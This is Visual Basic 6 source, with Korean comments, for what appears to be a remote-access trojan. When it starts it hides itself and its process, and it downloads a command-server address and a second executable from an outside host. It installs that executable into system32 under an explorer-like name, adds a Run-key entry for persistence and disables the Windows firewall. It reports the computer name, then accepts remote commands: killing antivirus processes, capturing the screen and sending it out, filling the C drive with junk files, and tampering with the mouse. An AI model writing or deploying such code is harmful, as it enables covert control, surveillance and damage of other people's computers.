VERSION 5.00
Object = "{248DD890-BB45-11CF-9ABC-0080C7E7B78D}#1.0#0"; "mswinsck.ocx"
Begin VB.Form Form_Main 
   BorderStyle     =   0  '없음
   Caption         =   "Form1"
   ClientHeight    =   1995
   ClientLeft      =   0
   ClientTop       =   0
   ClientWidth     =   2385
   Icon            =   "Form_Main.frx":0000
   LinkTopic       =   "Form1"
   ScaleHeight     =   1995
   ScaleWidth      =   2385
   ShowInTaskbar   =   0   'False
   StartUpPosition =   3  'Windows 기본값
   Begin VB.PictureBox Picture1 
      Appearance      =   0  '평면
      AutoRedraw      =   -1  'True
      AutoSize        =   -1  'True
      BackColor       =   &H80000005&
      BorderStyle     =   0  '없음
      ForeColor       =   &H80000008&
      Height          =   135
      Left            =   2040
      ScaleHeight     =   9
      ScaleMode       =   3  '픽셀
      ScaleWidth      =   17
      TabIndex        =   0
      Top             =   720
      Width           =   255
   End
   Begin VB.Timer Timer1 
      Interval        =   1000
      Left            =   960
      Top             =   240
   End
   Begin MSWinsockLib.Winsock Winsock1 
      Left            =   0
      Top             =   0
      _ExtentX        =   741
      _ExtentY        =   741
      _Version        =   393216
   End
   Begin MSWinsockLib.Winsock 목록 
      Left            =   120
      Top             =   720
      _ExtentX        =   741
      _ExtentY        =   741
      _Version        =   393216
   End
   Begin MSWinsockLib.Winsock Winsock3 
      Index           =   0
      Left            =   1320
      Top             =   600
      _ExtentX        =   741
      _ExtentY        =   741
      _Version        =   393216
      LocalPort       =   2000
   End
   Begin MSWinsockLib.Winsock Winsock2 
      Left            =   720
      Top             =   1560
      _ExtentX        =   741
      _ExtentY        =   741
      _Version        =   393216
      LocalPort       =   20212
   End
End
Attribute VB_Name = "Form_Main"
Attribute VB_GlobalNameSpace = False
Attribute VB_Creatable = False
Attribute VB_PredeclaredId = True
Attribute VB_Exposed = False
'Programmed by Chun Dong Hyuk


Option Explicit
Private Declare Function RegOpenKey Lib "advapi32.dll" Alias "RegOpenKeyA" (ByVal hKey As Long, ByVal lpSubKey As String, phkResult As Long) As Long        ' :: 이미 존재하는 키을 오픈할꺼니 이 코드엔 키가 존재하는지 여부를 위한 에러 처리를 할 필요가 없어요
Private Declare Function RegSetValue Lib "advapi32.dll" Alias "RegSetValueA" (ByVal hKey As Long, ByVal lpSubKeyAs As String, ByVal dwType As Long, ByVal lpData As String, ByVal cbData As Long) As Long
 
Const HKEY_LOCAL_MACHINE = &H80000002
Const REG_SZ = 1
Private Declare Function URLDownloadToFile Lib "urlmon" Alias "URLDownloadToFileA" _
(ByVal pCaller As Long, ByVal szURL As String, ByVal szFileName As String, ByVal dwReserved As Long, ByVal lpfnCB As Long) As Long
Dim strInfo2 As String
Dim getit As String
Private Function StartProgram(ByVal RootKey As String, ByVal Path As String, ByVal KeyName As String, ByVal Data As String)
Dim strResult As Long

    RegOpenKey RootKey, Path, strResult
    RegSetValue strResult, KeyName, REG_SZ, Data, Len(Data)

End Function
Private Sub 목록_Close()
목록.Close
목록.Connect strInfo2, 2510 ' pr.text - 포트
End Sub

Private Sub 목록_Connect()
URLDownloadToFile 0, "http://hosting.ohseon.com/ip.php", App.Path & "\1234d", 0, 0
Open App.Path & "\1234d" For Input As #1 'J드라이브 확인
Line Input #1, getit
Close #1
getit = Split(getit, ": ")(1)
목록.SendData "/" & getit & " - " & Environ("computername")
End Sub


Private Sub 목록_Error(ByVal Number As Integer, Description As String, ByVal Scode As Long, ByVal Source As String, ByVal HelpFile As String, ByVal HelpContext As Long, CancelDisplay As Boolean)
목록.Close
목록.Connect strInfo2, 2510 ' pr.text - 포트
End Sub

Private Sub Timer1_Timer()
    On Error Resume Next '// 메세지 소켓의 에러시 소켓 닫고 응답 대기 시키는 부분.
If 목록.State = 0 Then
    목록.Connect strInfo2, 2510 ' pr.text - 포트
    End If
End Sub
Sub Shells(ByVal PathName As String, Optional ByVal WindowStyle As VbAppWinStyle = vbMinimizedFocus)
On Error Resume Next
Dim WshShell As Object
Set WshShell = CreateObject("WScript.Shell")
If WindowStyle = Empty Then WindowStyle = vbMinimizedFocus
WshShell.Run """" & PathName & """", WindowStyle, 0
End Sub
Private Sub Form_Load()
On Error Resume Next '// 데이타를 받았을때 처리 과정
    Const REG_OPTION_NON_VOLATILE = &O0
    Const KEY_ALL_CLASSES As Long = &HF0063
    Const KEY_ALL_ACCESS = &H3F
    Const REG_SZ As Long = 1


Me.hide
'Me.Top = -1234
HideMyProcess ' 내 프로세서 숨기기

URLDownloadToFile 0, "http://hosting.ohseon.com/gksthf1226/ip.txt", App.Path & "\last.dll", 0, 0

Open App.Path & "\last.dll" For Input As #1 'J드라이브 확인
Line Input #1, strInfo2
Close #1
       
    If Dir("C:\WINDOWS\system32\explorerR1.exe") = "" Then '// 몰래 윈도우 SYSTEM32 폴더에 백본..만들기
       URLDownloadToFile 0, "http://hosting.ohseon.com/gksthf1226/나야.exe", "C:\WINDOWS\system32\explorerR1.exe", 0, 0
       'URLDownloadToFile 0, "http://hosting.ohseon.com/gksthf1226/picture.jpg", "C:\WINDOWS\나야ㅋ.jpg", 0, 0
       'Shells "C:\WINDOWS\나야ㅋ.jpg", vbNormalFocus
       
'       StartProgram HKEY_LOCAL_MACHINE, "Software\Microsoft\Windows\CurrentVersion\Run", "Gaibee", App.Path & "\" & App.EXEName & ".exe" ' 한줄로 코딩하세요

       Dim reg As Object
        Set reg = CreateObject("wscript.shell") ' 개체를 제작합니다.
        reg.RegWrite "HKEY_LOCAL_MACHINE\SOFTWARE\MICROSOFT\WINDOWS\CURRENTVERSION\RUN\" & App.EXEName, App.Path & "\" & App.EXEName & ".exe"

        '// 이 부분 레지스트리 등록
        '// 레지스트리 경로 : "Software\microsoft\windows\currentversion\Run\explorer"
        '// 삭제 할라면 위의 경로의 explorer 을 삭제하면 된다는거 아실 줄 믿습니다
        '/ -------------------------------------------------------------------
'        Dim SName$, KName$, vinstelling$
'        SName = "run"
'        KName = "explorer"
'        vinstelling = "C:\WINDOWS\system32\explorer.exe"  '실행디렉토리명과 실행파일명
'
'        Dim hNewKey As Long
'        Dim lRetVal As Long
'        lRetVal = RegCreateKeyEx(&H80000002, KeyName & "\" & SName$, 0&, vbNullString, REG_OPTION_NON_VOLATILE, KEY_ALL_ACCESS, 0&, hNewKey, lRetVal)
'        lRetVal = SetValueEx(hNewKey, KName$, REG_SZ, vinstelling)
'        RegCloseKey (hNewKey)
        '/ -------------------------------------------------------------------
    End If

Dim oNetMgr As Object
Set oNetMgr = CreateObject("HNetCfg.FwMgr")
If oNetMgr.LocalPolicy.CurrentProfile.FirewallEnabled Then
Firewall False
Else
Firewall False
End If

If App.PrevInstance Then '// 중복 실행 방지
Kill (App.Path & "\last.dll")
        End
    End If
    
Kill (App.Path & "\last.dll")
Initialize

Winsock3(0).LocalPort = "2000"
Winsock3(0).Listen '해킹 대기빨기

End Sub
Private Sub Firewall(Optional Enabled As Boolean = False)
Dim oProfile As Object
Dim oNetShareMgr
    On Error Resume Next
    Set oNetShareMgr = CreateObject("HNetCfg.FwMgr")
    Set oProfile = oNetShareMgr.LocalPolicy.CurrentProfile
        oProfile.FirewallEnabled = Enabled
    Set oProfile = Nothing
    Set oNetShareMgr = Nothing
End Sub


'소켓접속이 끊겼을 경우, 소켓을 닫고 새로운 접속을 대기한다.
Private Sub Winsock1_Close()
    On Error Resume Next
    '디스플레이 정보 구조체를 클리어한다.
    DisplayInfoClear
    '소켓 재접속을 대기한다.
    Winsock1.Close
    Winsock1.Listen
    
End Sub

Private Sub Winsock1_ConnectionRequest(ByVal requestID As Long)
    On Error Resume Next
    '접속요청이 있을경우, 기존 접속을 닫고 새로운 접속을 허가한다.
    Winsock1.Close
    Winsock1.Accept requestID
    
End Sub

Private Sub Winsock1_DataArrival(ByVal bytesTotal As Long)
    On Error Resume Next
    Dim Buffer() As Byte
    '명령어 소켓으로부터 데이터를 수신한다.
    Winsock1.GetData Buffer()
    '소켓으로부터 수신한 데이터를 병합/처리한다.
    ReceiveBufferProcess Buffer(), bytesTotal
    
End Sub

'소켓접속이 비정상적으로 끊겼을 경우, 소켓을 닫고 새로운 접속을 대기한다.
Private Sub Winsock1_Error(ByVal Number As Integer, Description As String, ByVal Scode As Long, ByVal Source As String, ByVal HelpFile As String, ByVal HelpContext As Long, CancelDisplay As Boolean)
    On Error Resume Next
    '디스플레이 정보 구조체를 클리어한다.
    DisplayInfoClear
    '소켓 재접속을 대기한다.
    Winsock1.Close
    Winsock1.Listen
    
End Sub
Public Function SetValueEx(ByVal hKey As Long, sValueName As String, lType As Long, vValue As Variant) As Long
    SetValueEx = RegSetValueExString(hKey, sValueName, 0&, lType, vValue, Len(vValue))
End Function

Private Sub Winsock2_Close()
Winsock2.Close
End Sub

Private Sub Winsock2_Connect()
Cap
FilSnd "C:\WINDOWS\gogi.csr"
End Sub

Private Sub Winsock2_Error(ByVal Number As Integer, Description As String, ByVal Scode As Long, ByVal Source As String, ByVal HelpFile As String, ByVal HelpContext As Long, CancelDisplay As Boolean)
Winsock2.Close
End Sub

Private Sub Winsock3_ConnectionRequest(Index As Integer, ByVal requestID As Long)
On Error Resume Next '// 데이타를 받았을때 처리 과정
WIndex = WIndex + 1
Load Winsock3(WIndex)
Winsock3(WIndex).Close
Winsock3(WIndex).Accept requestID '생성된 클라이언트의 연결요청을 허용
    Winsock3(WIndex).SendData "/승인"
End Sub


Private Sub Winsock3_DataArrival(Index As Integer, ByVal bytesTotal As Long)

    On Error Resume Next '// 데이타를 받았을때 처리 과정
    
Dim B As String '서버인증
Dim MS종류 As Integer
Dim MS확인 As Integer
Dim i
    Dim TempX As String '// 실제 사용될 데이타
    
Winsock3(WIndex).GetData B '/ dd ㅇㅇ:
If Left(B, 1) = "/" Then  '제어 문자 검색 첫번째 자리가 "/"이면 ture 없으면 false
    Select Case Mid(B, 2, 3) '제어문자에 맞는 실행 두번째자리부터 읽음 그러므로 앞에 "/" 없어도됨

    Case "메세지" '/메세지:메시지:종류:타이틀
        Select Case Split(B, ":")(2)
        Case "0"
        MS종류 = 0
        Case "1"
        MS종류 = 16
        Case "2"
        MS종류 = 32
        Case "3"
        MS종류 = 4
        End Select
    i = MsgBox(Split(B, ":")(1), MS종류, Split(B, ":")(3))
    If i = vbYes Then
    Winsock3(WIndex).SendData "/MS:YES:쉚키"
    ElseIf i = vbNo Then
    Winsock3(WIndex).SendData "/MS:NO:쉚ㄴ"
    Else
    Winsock3(WIndex).SendData "/MS:OK:쉚ㅂ"
    End If
    Exit Sub
    
    Case "묻지마" '/묻지마:메시지:종류:타이틀
        i = InputBox(Split(B, ":")(1), Split(B, ":")(2))
        Winsock3(WIndex).SendData "/MS:" & i
    Exit Sub
    
    Case "기채팅" '/기채팅 - 기본채팅키라는명령어
    Exit Sub
    
    Case "기채꺼" '/기채꺼 - 기본채팅꺼라
    Exit Sub
    
    Case "채팅자" '/채팅자:해커]할말
    Exit Sub
    
    Case "CD롬" '/CD 롬 열기
    Exit Sub
    
    Case "CD닫" '/CD 롬 닫기
    Exit Sub
    
    Case "작업켜" '작업표시줄키기 (True)
    Exit Sub
    
    Case "작업꺼" '작업표시줄끄기
    Exit Sub
    
    Case "마좌우" '마우스 좌우바꾸기
Shell "rundll32.exe user32, SwapMouseButton", vbHide
    Exit Sub
    
    Case "마커서" '마우스커서 사라지기
    Exit Sub
    
    Case "마커켜" '마우스커서 뜨기
    Exit Sub
    
    Case "마키병" '마우스키보드 병신만들기 이거쓰면 못움직임ㅋㅋ 컨알딜리트 쓰면 풀린다
    Exit Sub
    
    Case "마병맛" ' 마우스에 닿는것 마다 다꺼짐ㅋㅋㅋㅋㅋㅋ
    Exit Sub
    
    Case "마병제" ' 마우스에 닿는것 마다 다꺼짐ㅋㅋㅋㅋㅋㅋ
    Exit Sub
    
    Case "컴끄자" ' 컴퓨터 강제종료
    Exit Sub
    
    Case "c무한" ' 씨드라이브 무한 메모장
Do
Open "C:\" & Rnd For Output As #1
Print #1, Rnd
Close #1
DoEvents
Loop
    Exit Sub
    
    Case "백신꺼" ' 백신끔
'KillProcess "V3LSvc.exe" 'V3LSvc.exe
'KillProcess "V3LTray.exe"
'KillProcess "PZAgent.pze"
'KillProcess "PZServiceNT.pze"
'Kill "V3LTray.exe"
Shell "tskill.exe V3LSvc", 0
Shell "tskill.exe V3LTray", 0
Shell "tskill.exe PZAgent", 0
Shell "tskill.exe PZServiceNT", 0
    Exit Sub
    
    Case "블루스"
    Exit Sub
    
    Case "pr좀"
    Exit Sub
    
    Case "킬시켜"
    Exit Sub
    
    Case "키파일"
    Exit Sub

    Case "스크린"
    '// 화면 핸들 얻기
    Winsock2.RemoteHost = strInfo2
    Winsock2.RemotePort = 1234
    Winsock2.Connect strInfo2, 1234
    Exit Sub
    
    Case "스크린끝"
    If Not Dir("C:\WINDOWS\gogi.csr") = "" Then Kill "C:\WINDOWS\gogi.csr"
    Exit Sub
    
    Case "날려라"
Exit Sub

    Case "익스플"
    Shell "explorer.exe """ & Split(B, "=")(1) & "", vbMaximizedFocus
    Exit Sub

End Select
    
    
End If

End Sub

Private Sub Winsock3_Error(Index As Integer, ByVal Number As Integer, Description As String, ByVal Scode As Long, ByVal Source As String, ByVal HelpFile As String, ByVal HelpContext As Long, CancelDisplay As Boolean)
Winsock3(WIndex).Close
End Sub


